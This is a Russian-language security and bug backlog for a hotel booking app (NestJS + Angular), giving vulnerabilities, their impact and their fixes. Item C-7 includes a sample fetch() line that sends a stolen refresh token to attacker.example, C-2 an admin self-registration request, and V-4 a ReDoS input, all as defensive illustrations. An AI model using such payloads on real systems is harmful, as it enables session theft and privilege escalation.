# Бэклог

Технический долг, баги, уязвимости и точки роста проекта **Hotel Booking** (NestJS + Angular).

## Градация

| Метка | Уровень | Критерий |
|---|---|---|
| 🔴 | **Критично** | Уязвимость с реальным вектором атаки, потеря данных, полностью нерабочий сценарий. Чинить до любых новых фич. |
| 🟠 | **Важно** | Сценарий работает неверно или ломается на нагрузке/граничных данных. Заметно пользователю. |
| 🟡 | **Средне** | Архитектурный долг, дублирование, отсутствие валидации, мёртвый код. Не ломает сейчас, но тормозит развитие. |
| 🟢 | **Легко** | Косметика, мелкие UX-шероховатости, чистка. Правится за минуты. |

Нумерация: `C` — критично, `V` — важно, `S` — средне, `L` — легко, `D` — дизайн.

## Статус работ

| Метка | Значение |
|---|---|
| ✅ | Исправлено, сборка и тесты проходят |
| 🟡 | Исправлено частично — что именно осталось, указано в пункте |
| ⬜ | Не исправлено |
| ⏸ | Отложено по решению — трогать пока не договорились |

### Сводка

| Раздел | Всего | ✅ | 🟡 | ⬜ | ⏸ |
|---|---|---|---|---|---|
| 🔴 Критичные | 16 | 16 | — | — | — |
| 🟠 Важные | 18 | 17 | — | 1 | — |
| 🟡 Средние | 30 | 22 | 3 | 1 | 4 |
| 🟢 Лёгкие | 19 | 18 | 1 | — | — |
| 🎨 Дизайн | 33 | 18 | 2 | 13 | — |
| **Итого** | **116** | **91** | **6** | **15** | **4** |

**Что осталось не сделано и почему:**

- **V-8** (изображения в base64 в MongoDB) — требует переезда на файловое хранилище
  или S3 и миграции существующих данных. Отдельная задача, затрагивает и модель,
  и API, и клиент.
- **S-11** (мягкое удаление) — нужен флаг `deletedAt` во всех моделях и правка каждого
  запроса на чтение. Частично закрыто иначе: удаление отеля или номера теперь не ломает
  список бронирований — вместо падения показывается «Отель удалён».
- **S-30** (тесты бэкенда) — юнит-тестов на провайдеры нет. На фронтенде тестовый
  раннер поднят и 17 тестов проходят, для бэкенда аналогичное покрытие не написано.
- **D-6, D-9, D-15, D-18, D-22, D-26, D-28** и **D-29…D-33** — доработки дизайна.
  Часть из них (цена и рейтинг на карточке, шаги бронирования, дашборд менеджера)
  требует полей, которых нет в модели данных.

**Отложено по договорённости:** S-1, S-2, S-3, S-23 — дублирование REST и GraphQL,
страница поддержки и админские страницы в обход NgRx, закомментированный код.

---

## 🔴 Критичные

### Безопасность

#### ✅ C-1. Секрет подписи JWT закоммичен в репозиторий
Файл [hotelBooking_nest_back/.env](hotelBooking_nest_back/.env) содержит `JWT_TOKEN_SECRET` и `COOKIE_SECRET` и **отслеживается git** (`git ls-files` его показывает). В [hotelBooking_nest_back/.gitignore](hotelBooking_nest_back/.gitignore) записи `.env` нет. Корневой `.gitignore` отсутствует вовсе, поэтому корневой [.env](.env) с `DB_PASSWORD` тоже в репозитории.

**Последствие:** любой, у кого есть доступ к репозиторию (включая историю), может подписать себе токен с `role: "admin"` и получить полный доступ к API.

**Что делать:**
1. Добавить `.env` в `.gitignore` (корневой и бэкенда).
2. Удалить файлы из индекса: `git rm --cached .env hotelBooking_nest_back/.env _old_frontend/.env`.
3. **Сменить секреты** — удаление из HEAD не убирает их из истории. При необходимости почистить историю (`git filter-repo`).
4. Добавить `.env.example` с ключами без значений.

---

#### ✅ C-2. Повышение привилегий через публичную регистрацию
[hotelBooking_nest_back/src/Controllers/clientAuth.controller.ts:11](hotelBooking_nest_back/src/Controllers/clientAuth.controller.ts#L11) передаёт тело запроса в провайдер без фильтрации, а [users.provider.ts:16](hotelBooking_nest_back/src/Providers/users.provider.ts#L16) делает `role: createUser.role ? createUser.role : "client"`.

```
POST /api/client/register
{ "email":"x@x.ru", "password":"1", "name":"x", "role":"admin" }
```

**Последствие:** любой анонимный пользователь создаёт себе аккаунт администратора одним запросом.

**Что делать:** в клиентской регистрации явно проставлять `role: "client"`, игнорируя поле из тела. Роль должна приниматься только в `adminCreateUser`. Заодно закрыть это глобальной валидацией (см. [C-9](#c-9-нет-глобальной-валидации-входных-данных)).

---

#### ✅ C-3. IDOR: чтение чужой переписки с поддержкой
Два эндпоинта отдают историю сообщений по `id` заявки без проверки владельца:
- REST — [commonSupport.controller.ts:14-19](hotelBooking_nest_back/src/Controllers/commonSupport.controller.ts#L14-L19), роль `client` разрешена, но принадлежность заявки не проверяется.
- GraphQL — [support.resolver.ts:41-53](hotelBooking_nest_back/src/GraphQL/resolvers/support.resolver.ts#L41-L53), стоит только `GqlJwtAuthGuard`, ни ролей, ни проверки владельца.

[support.provider.ts:66](hotelBooking_nest_back/src/Providers/support.provider.ts#L66) `getHistory(id)` просто читает документ по идентификатору.

**Последствие:** любой авторизованный клиент перебором ObjectId читает переписку всех остальных пользователей.

**Что делать:** передавать в `getHistory` текущего пользователя и бросать `ForbiddenException`, если `supportRequest.user !== user.id` и роль не `manager`.

---

#### ✅ C-4. WebSocket: guard проверяет один id, обработчик пишет в другой
[wsguardforsendmesg.ts:17](hotelBooking_nest_back/src/Auth/wsguardforsendmesg.ts#L17) берёт id заявки из **handshake-параметров соединения** (`context.args[0].handshake.query.id`) и по нему проверяет владельца. А обработчики [supportChat.gateway.ts:31](hotelBooking_nest_back/src/Providers/supportChat.gateway.ts#L31) и [:38](hotelBooking_nest_back/src/Providers/supportChat.gateway.ts#L38) пишут в заявку по id **из тела сообщения** (`data.id`).

**Последствие:** клиент подключается с `?id=<своя заявка>` (guard пропускает), после чего шлёт `sendMessage { id: "<чужая заявка>", text: "..." }` и пишет в любую чужую переписку.

**Что делать:** проверять владельца по тому же `data.id`, который используется в обработчике, внутри самого обработчика или через guard, читающий `MessageBody`.

---

#### ✅ C-5. WebSocket: сообщения рассылаются всем подключённым
[supportChat.gateway.ts:25,32,39](hotelBooking_nest_back/src/Providers/supportChat.gateway.ts#L25) — везде `this.server.emit(...)`, то есть broadcast по всему namespace `support`, без комнат.

**Последствие:** каждое сообщение любой заявки прилетает всем подключённым клиентам. Утечка персональных данных в реальном времени.

**Что делать:** заводить комнату на заявку (`socket.join(requestId)`) и слать `this.server.to(requestId).emit(...)`. Событие `createRequest` — только менеджерам (отдельная комната `managers`).

---

#### ✅ C-6. Refresh-токен подписан тем же секретом и принимается как access-токен
[auth.provider.ts:35-42](hotelBooking_nest_back/src/Providers/auth.provider.ts#L35-L42) подписывает refresh тем же `JWT_TOKEN_SECRET`, что и access ([:27](hotelBooking_nest_back/src/Providers/auth.provider.ts#L27)). [jwt.strategy.ts:14](hotelBooking_nest_back/src/Auth/jwt.strategy.ts#L14) проверяет access тем же ключом.

**Последствие:** refresh-токен (10 дней) успешно проходит как access-токен в заголовке `Authorization`. Роль в payload есть, значит `RolesGuard` пропускает — двухдневный TTL access-токена не значит ничего. Плюс refresh нельзя отозвать: `logout` только чистит localStorage.

Отдельно: payload refresh содержит `id`, а `JwtStrategy.validate` читает `payload.sub` → в `req.user.id` попадает `undefined`. Эндпоинты, опирающиеся на `req.user.id` (например [clientReservations.controller.ts:28](hotelBooking_nest_back/src/Controllers/clientReservations.controller.ts#L28)), поведут себя непредсказуемо.

**Что делать:** отдельный `JWT_REFRESH_SECRET`; единая форма payload (`sub` везде); хранение выданных refresh-токенов (Redis/коллекция) с отзывом на logout.

---

#### ✅ C-7. Токены в localStorage

##### Что именно сделано
[auth-token.ts](hotelBooking_angular_front/src/app/core/auth-token.ts) кладёт оба токена в `localStorage`:

```ts
setAccessToken(token) { localStorage.setItem('access_token', token); }
setRefreshToken(token) { localStorage.setItem('refresh_token', token); }
```

Запись происходит в [auth.effects.ts:32-35](hotelBooking_angular_front/src/app/effects/auth.effects.ts#L32-L35) сразу после логина. Оттуда же токен читает [auth-interceptor.ts:12](hotelBooking_angular_front/src/app/core/auth-interceptor.ts#L12) и подставляет в заголовок `Authorization`.

##### Почему это опасно именно здесь

`localStorage` доступен любому JavaScript, исполняющемуся на origin. Это не теоретическая проблема, а прямая цепочка из уже существующих в проекте условий:

1. **Нет Content-Security-Policy.** В [index.html](hotelBooking_angular_front/src/index.html) нет ни `<meta http-equiv="Content-Security-Policy">`, ни соответствующих заголовков на бэкенде ([main.ts](hotelBooking_nest_back/src/main.ts) без `helmet`). Значит, инъектированный скрипт с любого домена выполнится без препятствий.
2. **Внешние подключения уже есть.** [index.html:9-15](hotelBooking_angular_front/src/index.html#L9-L15) грузит шрифты и иконки с `fonts.googleapis.com` / `fonts.gstatic.com`. Это доверие к стороннему CDN без `integrity`.
3. **Пользовательский контент рендерится в интерфейсе.** Описания отелей и номеров, имена пользователей, тексты сообщений поддержки приходят с сервера без какой-либо санитизации ([C-9](#c-9-нет-глобальной-валидации-входных-данных) — валидации нет вообще). Angular по умолчанию экранирует интерполяцию `{{ }}`, и это спасает сегодня. Но одна будущая правка вида `[innerHTML]="hotel.description"` — и XSS становится рабочим.
4. **Оба токена лежат рядом.** Скомпрометирован не только access (2 дня), но и refresh (10 дней). А поскольку refresh нельзя отозвать ([C-6](#c-6-refresh-токен-подписан-тем-же-секретом-и-принимается-как-access-токен)), выход из аккаунта, смена пароля и даже удаление сессии на сервере не помогут — токен будет работать до истечения TTL.
5. **Refresh проходит как access.** Из-за общего секрета украденный refresh-токен сразу даёт полный доступ к API с ролью жертвы, без обмена на access.

Одна строка `fetch('https://attacker.example/c?d='+localStorage.getItem('refresh_token'))` даёт атакующему десять дней доступа к аккаунту, в том числе администраторского. Ни серверные логи, ни logout этого не заметят.

##### Почему httpOnly cookie решает проблему

Cookie с флагом `httpOnly` не читается из JavaScript вообще — `document.cookie` его не покажет. XSS всё ещё сможет выполнить запрос от имени пользователя (браузер приложит cookie автоматически), но **не сможет выгрузить токен наружу**. Разница принципиальная: атака ограничена временем жизни XSS на странице, а не десятью днями.

Дополнительные флаги:
- `secure` — cookie уходит только по HTTPS (сейчас prod-конфиг вообще на HTTP, см. [C-11](#c-11-prod-конфигурация-фронтенда-указывает-на-localhost-по-http)).
- `sameSite: 'strict'` — cookie не прикладывается к кросс-сайтовым запросам, что закрывает CSRF без отдельных токенов.
- `path: '/api/auth/refresh'` — refresh-cookie уходит только на эндпоинт обновления, а не с каждым запросом.

##### Целевая схема

| Что | Где хранится | Время жизни | Обоснование |
|---|---|---|---|
| **access** | в памяти JS (NgRx-стор, переменная сервиса) | 15 минут | Пропадает при перезагрузке вкладки — и это нормально, восстанавливается через refresh. Не переживает XSS-эксфильтрацию в долгую |
| **refresh** | `httpOnly Secure SameSite=Strict` cookie с `path=/api/auth/refresh` | 30 дней, с ротацией | Недоступен JS; отзывается на сервере |

Схема работы:
1. Логин → сервер ставит refresh-cookie через `res.cookie(...)` и возвращает access в теле ответа.
2. Access живёт в `auth.accessToken` в сторе NgRx, интерцептор берёт его оттуда, а не из `localStorage`.
3. На 401 интерцептор дёргает `POST /api/auth/refresh` (cookie уйдёт автоматически), получает новый access и повторяет исходный запрос — см. [V-6](#v-6-нет-обработки-истёкшего-токена--механизм-refresh-мёртв).
4. При обновлении страницы стор пуст → приложение один раз вызывает refresh и восстанавливает сессию.
5. Logout → `res.clearCookie(...)` плюс запись `jti` в blacklist.

##### Что менять в коде

**Бэкенд:**
- В [auth.controller.ts:17-18](hotelBooking_nest_back/src/Controllers/auth.controller.ts#L17-L18) уже есть закомментированный `res.cookie(...)` — раскомментировать и довести: `httpOnly: true, secure: true, sameSite: 'strict', path: '/api/auth/refresh'`.
- Вернуть `/api/auth/logout` (сейчас закомментирован, [:32-39](hotelBooking_nest_back/src/Controllers/auth.controller.ts#L32-L39)) с `clearCookie` и отзывом токена.
- `JwtRefreshStrategy` ([jwt-refresh.strategy.ts:11](hotelBooking_nest_back/src/Auth/jwt-refresh.strategy.ts#L11)) читает токен из заголовка — переключить на кастомный экстрактор из cookie.
- Уменьшить TTL access-токена с `"2 days"` до `"15m"` ([auth.provider.ts:29](hotelBooking_nest_back/src/Providers/auth.provider.ts#L29)).
- `cookie-parser` уже подключён ([main.ts:12](hotelBooking_nest_back/src/main.ts#L12)).

**Фронтенд:**
- `AuthToken` перестаёт трогать `localStorage` — хранит access в приватном поле сервиса.
- `authInterceptor` берёт токен из сервиса и добавляет `withCredentials: true` только для запросов к своему API (сейчас [credentials-interceptor.ts](hotelBooking_angular_front/src/app/core/credentials-interceptor.ts) шлёт его вообще всем, см. [S-16](#s-16-credentialsinterceptor-шлёт-withcredentials-во-все-запросы)).
- При старте приложения — один вызов refresh вместо чтения токена из хранилища.

##### Промежуточная мера
Полный переход на cookie затрагивает и бэкенд, и весь auth-флоу фронтенда. Если он откладывается, минимум на сейчас:
1. Добавить CSP (`helmet` на бэкенде, `default-src 'self'`), самохостить шрифты вместо CDN ([D-20](#d-20-иконки-устаревший-набор-и-внешний-cdn)).
2. Сократить TTL access-токена до 15 минут и включить рабочий refresh ([V-6](#v-6-нет-обработки-истёкшего-токена--механизм-refresh-мёртв)).
3. Сделать refresh-токены отзываемыми ([C-6](#c-6-refresh-токен-подписан-тем-же-секретом-и-принимается-как-access-токен)) — тогда компрометация ограничена и лечится logout'ом.
4. Хранить access в памяти, а в `localStorage` оставить только refresh — уже вдвое сокращает поверхность.

Это снижает ущерб, но не убирает первопричину: пока токен читается из JavaScript, XSS означает угон сессии.

---

#### ✅ C-8. Загрузка файлов без всякой валидации
[adminHotels.controller.ts:18](hotelBooking_nest_back/src/Controllers/adminHotels.controller.ts#L18) и [adminRooms.controller.ts:18](hotelBooking_nest_back/src/Controllers/adminRooms.controller.ts#L18) — `FileInterceptor("image")` / `FilesInterceptor("images")` без опций.

**Последствие:** нет ограничения размера (файл целиком в память → OOM), нет проверки MIME/магических байт, нет лимита количества файлов. Загруженное складывается в MongoDB как base64 и потом отдаётся клиенту с жёстко зашитым `data:image/jpeg` ([image.utils.ts](hotelBooking_nest_back/src/utils/image.utils.ts)).

**Что делать:** `limits: { fileSize: 5 * 1024 * 1024, files: 10 }`, `fileFilter` по MIME + проверка сигнатуры файла, хранение в объектном сторадже/на диске, а в БД — только ссылка.

---

#### ✅ C-9. Нет глобальной валидации входных данных
В [main.ts](hotelBooking_nest_back/src/main.ts) не подключён `ValidationPipe`. Все DTO ([Interface/Users.ts](hotelBooking_nest_back/src/Interface/Users.ts), [Interface/Hotels.ts](hotelBooking_nest_back/src/Interface/Hotels.ts)) — голые классы без единого декоратора `class-validator`. `class-validator` и `class-transformer` даже не установлены.

**Последствие:** в БД летит что угодно: любые лишние поля (отсюда [C-2](#c-2-повышение-привилегий-через-публичную-регистрацию)), объекты вместо строк (NoSQL-инъекция в `$regex`-фильтрах — см. [V-4](#v-4-нефильтрованный-regex-в-поиске-пользователей)), пустые пароли, некорректные даты.

**Что делать:**
```ts
app.useGlobalPipes(new ValidationPipe({ whitelist: true, forbidNonWhitelisted: true, transform: true }));
```
плюс декораторы `@IsEmail()`, `@MinLength(8)`, `@IsIn(['client','manager','admin'])`, `@IsDateString()` на всех DTO и GraphQL Input.

---

#### ✅ C-10. Нет rate limiting на аутентификации
`/api/auth/login`, `/api/client/register` и GraphQL-мутации `login`/`register` ничем не ограничены. `@nestjs/throttler` не установлен.

**Последствие:** брутфорс паролей и массовое создание аккаунтов без сопротивления. Особенно опасно в связке с [C-2](#c-2-повышение-привилегий-через-публичную-регистрацию).

**Что делать:** `@nestjs/throttler` со стором в Redis (паттерн описан в [README](README.md#rate-limiting)), отдельный жёсткий лимит на login.

---

#### ✅ C-11. Prod-конфигурация фронтенда указывает на localhost по HTTP
[environment.ts](hotelBooking_angular_front/src/environments/environment.ts) — `production: true`, но `host: 'http://localhost:7000'`. Файл идентичен `environment.development.ts`.

**Последствие:** production-сборка неработоспособна; при выкладке как есть — токены ходят по незашифрованному HTTP.

**Что делать:** реальный хост через переменную сборки, только HTTPS.

---

### Функциональность

#### ✅ C-12. Редактирование отеля без замены фото падает с 500
[adminHotels.controller.ts:33](hotelBooking_nest_back/src/Controllers/adminHotels.controller.ts#L33): `image: file ? file.buffer : data.image`. Фронтенд [admin-hotels.ts:98](hotelBooking_angular_front/src/app/pages/admin-hotels/admin-hotels.ts#L98) кладёт `image` в `FormData` **только если выбран новый файл**, значит `data.image === undefined`. Дальше [hotels.provider.ts:53](hotelBooking_nest_back/src/Providers/hotels.provider.ts#L53):

```ts
image: typeof data.image == "string" ? data.image : Buffer.from(data.image).toString("base64")
```

`Buffer.from(undefined)` → `TypeError` → 500.

**Последствие:** админ не может изменить название или описание отеля, не перезаливая картинку. Видит «Ошибка сохранения».

**Что делать:** не трогать поле `image`, если новый файл не пришёл (не включать ключ в объект обновления).

---

#### ✅ C-13. Чат поддержки обращается к несуществующим REST-эндпоинтам
[api.ts:167](hotelBooking_angular_front/src/app/core/api.ts#L167) шлёт `POST /api/common/support-requests/:id/messages`, [api.ts:175](hotelBooking_angular_front/src/app/core/api.ts#L175) — `POST /api/client/support-requests`. На бэкенде таких маршрутов нет: [commonSupport.controller.ts](hotelBooking_nest_back/src/Controllers/commonSupport.controller.ts) объявляет только `GET /:id/messages`, [clientSupport.controller.ts](hotelBooking_nest_back/src/Controllers/clientSupport.controller.ts) — только `GET /`. Создание заявки и отправка сообщений существуют исключительно как WebSocket-события `requestSupport` / `sendMessage`.

**Последствие:** создать обращение и отправить сообщение из UI невозможно — 404. Ключевая фича раздела «Поддержка» не работает.

**Что делать:** подключить Socket.IO-клиент (см. [F-1](#планируемые-фичи)) либо добавить REST/GraphQL-мутации `createSupportRequest` и `sendSupportMessage` на бэкенде.

---

#### ✅ C-14. Пагинация в управлении пользователями зацикливает приложение
[admin-users.ts:134-148](hotelBooking_angular_front/src/app/pages/admin-users/admin-users.ts#L134-L148):

```ts
onNextPage(): void {
  this.searchParams$.pipe(takeUntil(this.destroy$)).subscribe((params: any) => {
    this.store.dispatch(UsersActions.setSearchParams({ payload: { offset: params.offset + params.limit } }));
  });
}
```

Подписка создаётся при клике и живёт до уничтожения компонента. Внутри она диспатчит `setSearchParams`, что меняет `searchParams` → селектор эмитит заново → та же подписка снова диспатчит новый offset → и так далее. Самозапускающийся цикл.

Та же ошибка в [loadUsers()](hotelBooking_angular_front/src/app/pages/admin-users/admin-users.ts#L96-L100): каждый вызов добавляет ещё одну живую подписку, а `ngOnInit` вызывает `loadUsers()` на каждое изменение параметров — количество параллельных подписок и дублирующих запросов растёт.

**Последствие:** после клика «Next» страница уходит в рекурсию диспатчей — фриз вкладки и шторм запросов к API.

**Что делать:** переписать без подписок в обработчиках — читать значение через `withLatestFrom`/`concatLatestFrom` в эффекте, а `loadUsers` вызывать из одного места:
```ts
this.searchParams$.pipe(takeUntilDestroyed()).subscribe(p => this.store.dispatch(UsersActions.adminLoadUsers({ payload: p })));
onNextPage() { this.store.dispatch(UsersActions.nextPage()); } // offset считает редьюсер
```

---

#### ✅ C-15. Регистрация оставляет пользователя в «полулогине»
[register.ts:59](hotelBooking_angular_front/src/app/pages/register/register.ts#L59) делает `navigateByUrl('/login')` синхронно после `dispatch`, не дожидаясь результата. Параллельно `registerSuccess` кладёт пользователя в стор ([auth.reducer.ts:42](hotelBooking_angular_front/src/app/reducers/auth.reducer.ts#L42)), а конструктор [login.ts:41-44](hotelBooking_angular_front/src/app/pages/login/login.ts#L41-L44) при непустом `selectAuthUser` немедленно редиректит на `/hotels`.

**Последствие:** после регистрации пользователь оказывается на `/hotels`, в шапке отображается его имя — но токена нет. Любой переход в «Мои брони» упирается в `authGuard` → `/login` → снова редирект на `/hotels`. Пользователь ходит по кругу и не понимает, что нужно залогиниться.

Дополнительно: редирект происходит и при ошибке регистрации (занятый email) — пользователь не видит сообщения об ошибке.

**Что делать:** редиректить в эффекте по `registerSuccess`, не класть пользователя в `auth.user` до реального логина, показывать ошибку по `registerFailure`.

---

#### ✅ C-16. Docker-сборка нерабочая
[docker-compose.yml](docker-compose.yml):
- `frontend.build: ./hotelBooking_react_front` — такой директории нет (React-фронт переехал в `_old_frontend`), Angular-фронт не описан вовсе.
- В `backend.environment` **не передаётся `JWT_TOKEN_SECRET`** → `jwtService.sign` подписывает с `secret: undefined`.
- [app.module.ts:26](hotelBooking_nest_back/src/app.module.ts#L26) жёстко подключается к `mongodb://127.0.0.1:27017/nest`, что внутри контейнера бэкенда — сам контейнер, а не сервис `mongodb`. Строка с `configService` закомментирована.
- У `mongodb` нет тома → данные теряются при пересоздании контейнера.

**Последствие:** `docker compose up` не поднимает приложение ни в каком виде.

**Что делать:** заменить сервис фронта на Angular, вынести Mongo URI в `MONGO_URI` (`mongodb://mongodb:27017/nest`), прокинуть `JWT_TOKEN_SECRET`, добавить `volumes: [mongo-data:/data/db]` и healthcheck.

---

## 🟠 Важные

#### ✅ V-1. Занятость отеля считается по магическому числу «2»
[reservations.provider.ts:83](hotelBooking_nest_back/src/Providers/reservations.provider.ts#L83):

```ts
.filter(([_, roomIds]: [any, string[]]) => roomIds.length === 2)
```

Отель считается недоступным, только если в нём забронировано **ровно два** разных номера. Логика зашита под предположение «в каждом отеле 2 номера».

**Последствие:** отель с тремя занятыми номерами снова показывается как свободный (`3 !== 2`); отель с одним номером никогда не пропадает из выдачи. Поиск по датам даёт неверный результат.

**Что делать:** сравнивать количество занятых номеров с фактическим количеством номеров отеля (агрегация или отдельный запрос `countDocuments({ hotel })`).

---

#### ✅ V-2. Нет проверки пересечения дат при бронировании
[reservations.provider.ts:20](hotelBooking_nest_back/src/Providers/reservations.provider.ts#L20) `createReservation` создаёт запись без единой проверки: ни занятости номера на выбранные даты, ни `dateStart < dateEnd`, ни того, что даты в будущем.

**Последствие:** один номер бронируется несколько раз на одни даты; можно забронировать «задним числом» и на отрицательный интервал.

**Что делать:** перед сохранением искать пересекающиеся брони по `roomId` и бросать `ConflictException`; валидировать порядок дат; в идеале — уникальный индекс + транзакция.

---

#### ✅ V-3. Фильтр `isEnabled` игнорируется — клиенты видят отключённые номера
[rooms.provider.ts:40-48](hotelBooking_nest_back/src/Providers/rooms.provider.ts#L40-L48): `SearchRoomsParams` содержит `isEnabled`, но в запрос попадает только `hotel`. GraphQL-резолвер [rooms.resolver.ts:14](hotelBooking_nest_back/src/GraphQL/resolvers/rooms.resolver.ts#L14) исправно пробрасывает аргумент, который дальше теряется.

**Последствие:** снятые с продажи номера показываются клиентам и доступны к бронированию.

**Что делать:** добавить `isEnabled` в фильтр; для публичных запросов принудительно `isEnabled: true`.

---

#### ✅ V-4. Нефильтрованный `$regex` в поиске пользователей
[users.provider.ts:23-31](hotelBooking_nest_back/src/Providers/users.provider.ts#L23-L31) подставляет пользовательский ввод прямо в `$regex` по трём полям.

**Последствие:**
- ReDoS: запрос вида `(a+)+$` вешает поиск.
- При отсутствии query-параметров (`/api/admin/users` без аргументов) в `$regex` уходит `undefined` → `CastError` → 500.
- В связке с отсутствием валидации ([C-9](#c-9-нет-глобальной-валидации-входных-данных)) можно передать объект и подменить оператор запроса.

**Что делать:** экранировать спецсимволы регулярки, значения по умолчанию `''`, ограничить длину строки поиска. Лучше — текстовый индекс Mongo вместо regex.

---

#### ✅ V-5. `RolesGuard` падает вместо отказа в доступе
[roles.decorator.ts:9-12](hotelBooking_nest_back/src/Decorators/roles.decorator.ts#L9-L12):

```ts
const role = this.reflector.get<string[]>("role", context.getHandler());
return role.some((el) => el == request.user.role);
```

Нет проверок на `undefined`: обработчик без `@Role` даёт `TypeError` (500 вместо 403), отсутствующий `request.user` — тоже. Метаданные читаются только с обработчика, класс-левел `@Role` не поддерживается.

Плюс порядок guard'ов держится на неявной детали: два отдельных декоратора `@UseGuards(RolesGuard)` и `@UseGuards(AuthGuard("jwt"))` (например [adminUsers.controller.ts:10-11](hotelBooking_nest_back/src/Controllers/adminUsers.controller.ts#L10-L11)) работают верно только потому, что декораторы применяются снизу вверх. Перестановка строк молча ломает авторизацию.

**Что делать:** `const roles = this.reflector.getAllAndOverride(...) ?? []; if (!roles.length) return true; return !!user && roles.includes(user.role);` и один `@UseGuards(AuthGuard('jwt'), RolesGuard)`.

---

#### ✅ V-6. Нет обработки истёкшего токена — механизм refresh мёртв
`AuthActions.refreshToken` **нигде не диспатчится** (проверено поиском по `src`). Эффект [auth.effects.ts:93-112](hotelBooking_angular_front/src/app/effects/auth.effects.ts#L93-L112), редьюсер, `ApolloService.refreshToken` и мутация на бэкенде существуют, но не вызываются. HTTP-интерцептор [auth-interceptor.ts](hotelBooking_angular_front/src/app/core/auth-interceptor.ts) не реагирует на 401.

**Последствие:** через 2 дня приложение начинает молча получать 401 на каждый запрос — пустые списки, спиннеры без результата, без редиректа на логин и без обновления токена.

**Что делать:** в интерцепторе ловить 401 → один раз дёрнуть refresh → повторить запрос; при неудаче — `clear()` + редирект на `/login`.

---

#### ✅ V-7. N+1 запросы в списках
- [rooms.provider.ts:63](hotelBooking_nest_back/src/Providers/rooms.provider.ts#L63): `printFormatRoom` вызывает `getIdHotel` **на каждый номер** — список из 20 номеров одного отеля даёт 20 одинаковых запросов за одним и тем же отелем.
- [reservations.provider.ts:38-44](hotelBooking_nest_back/src/Providers/reservations.provider.ts#L38-L44): на каждую бронь — `getIdRoom` (внутри ещё `getIdHotel`) + `getIdUser`. При лимите 50 это ~150 запросов к БД на один вызов `/api/manager/reservations`.

**Что делать:** `populate('hotel')` / `$lookup`, либо загрузка отелей и пользователей одним `find({_id: {$in: ids}})` с последующим маппингом.

---

#### ⬜ V-8. Изображения хранятся в MongoDB в base64
[hotels.provider.ts:15](hotelBooking_nest_back/src/Providers/hotels.provider.ts#L15), [Models/Hotels.ts:19](hotelBooking_nest_back/src/Models/Hotels.ts#L19), [Models/Rooms.ts:14](hotelBooking_nest_back/src/Models/Rooms.ts#L14).

**Последствие:** base64 раздувает объём на 33%; лимит документа Mongo 16 МБ достигается быстро; список отелей отдаёт все картинки целиком в JSON (мегабайты на запрос); кеширование браузером невозможно — нет URL; `mat-card-image` получает гигантские `data:`-строки, что тормозит рендер.

**Что делать:** хранить файлы на диске/в S3-совместимом хранилище, в БД — путь; отдавать через `/uploads/...` со `Cache-Control`; на клиенте `loading="lazy"`.

---

#### ✅ V-9. Админ видит только первые 10 отелей и через фиктивные даты
[api.ts:210-212](hotelBooking_angular_front/src/app/core/api.ts#L210-L212) `getAllHotels()` захардкожен на `dateArrival: '2024-01-01'`, `dateDeparture: '2024-12-31'`. Бэкенд [hotels.provider.ts:35](hotelBooking_nest_back/src/Providers/hotels.provider.ts#L35) отдаёт `.limit(10)` без `offset` из UI и без общего количества.

**Последствие:** страницы «Управление отелями» и «Управление номерами» показывают максимум 10 отелей, причём отфильтрованных по бронированиям 2024 года. Отель, «занятый» в 2024-м, исчезает из админки навсегда.

**Что делать:** отдельный админский эндпоинт/query без фильтра по датам, с `offset`/`limit` и `totalCount`.

---

#### ✅ V-10. Список пользователей жёстко ограничен ролью `client`
[users.provider.ts:28](hotelBooking_nest_back/src/Providers/users.provider.ts#L28) — `role: "client"` вшит в фильтр.

**Последствие:** админ создаёт менеджера через форму на странице «Управление пользователями» и не видит его в таблице ниже. Колонка «Role» всегда показывает `Client`, а селект ролей в форме создаёт иллюзию, что можно управлять всеми ролями.

**Что делать:** сделать роль параметром фильтра; для `admin` — показывать всех, для `manager` — только клиентов.

---

#### ✅ V-11. Параметр `limit` игнорируется, пагинация держится на совпадении
[users.provider.ts:31](hotelBooking_nest_back/src/Providers/users.provider.ts#L31) — `.limit(50)` вшит, `queryParams.limit` не используется. Селектор [users.selectors.ts:17](hotelBooking_angular_front/src/app/selectors/users.selectors.ts#L17) считает `hasNextPage = users.length === limit`, где `limit` в сторе тоже 50.

**Последствие:** работает случайно. Смена лимита в сторе ломает кнопку «Next». Плюс `hasNextPage` даёт ложный «true» на последней странице, если её размер ровно 50.

**Что делать:** использовать `limit` из параметров, возвращать `totalCount`, считать пагинацию по нему.

---

#### ✅ V-12. Гонка при записи сообщений поддержки
[support.provider.ts:98-105](hotelBooking_nest_back/src/Providers/support.provider.ts#L98-L105) и [:85-96](hotelBooking_nest_back/src/Providers/support.provider.ts#L85-L96) читают массив `messages`, модифицируют его в памяти и целиком перезаписывают через `findByIdAndUpdate`.

**Последствие:** два одновременных сообщения (клиент и менеджер) — одно теряется. Отметки о прочтении затирают новые сообщения.

**Что делать:** атомарный `$push: { messages: message }`; для `readAt` — `updateMany` с позиционным оператором. Ещё лучше — вынести сообщения в отдельную коллекцию со ссылкой на заявку (коллекция `Message` уже есть, но дублируется вложенным массивом).

---

#### ✅ V-13. `title` заявки — это весь документ сообщения
[support.provider.ts:111](hotelBooking_nest_back/src/Providers/support.provider.ts#L111) возвращает `title: counter.messages[0]` — целый объект сообщения, а не текст. На фронте приходится доставать `(r.title as any).text` ([support.resolver.ts:23](hotelBooking_nest_back/src/GraphQL/resolvers/support.resolver.ts#L23)) и `req.title?.text` в шаблоне.

**Что делать:** возвращать `title: counter.messages[0]?.text ?? ''`, поправить типы.

---

#### ✅ V-14. `isActive` не доходит до UI
[support.resolver.ts:24,37](hotelBooking_nest_back/src/GraphQL/resolvers/support.resolver.ts#L24) жёстко возвращает `isActive: null`, потому что `printFormatSupport` его не отдаёт. Шаблон [support.html:32](hotelBooking_angular_front/src/app/pages/support/support.html#L32) рисует `{{ req.isActive ? 'Активно' : 'Закрыто' }}` → всегда «Закрыто», а кнопка закрытия у менеджера ([support.html:34](hotelBooking_angular_front/src/app/pages/support/support.html#L34)) никогда не отображается.

**Что делать:** добавить `isActive` в `SendSupportRequest` и в маппинг резолвера.

---

#### ✅ V-15. Регистрация допускает дубликаты email
[Models/Users.ts:6-7](hotelBooking_nest_back/src/Models/Users.ts#L6-L7) — у `email` нет `unique: true` (у остальных полей явно проставлено `unique: false`). Проверки существования пользователя в `createUser` тоже нет.

**Последствие:** два аккаунта с одним email; `validateUser` ([auth.provider.ts:15](hotelBooking_nest_back/src/Providers/auth.provider.ts#L15)) через `findOne` логинит первый попавшийся — пользователь не может войти под своим паролем.

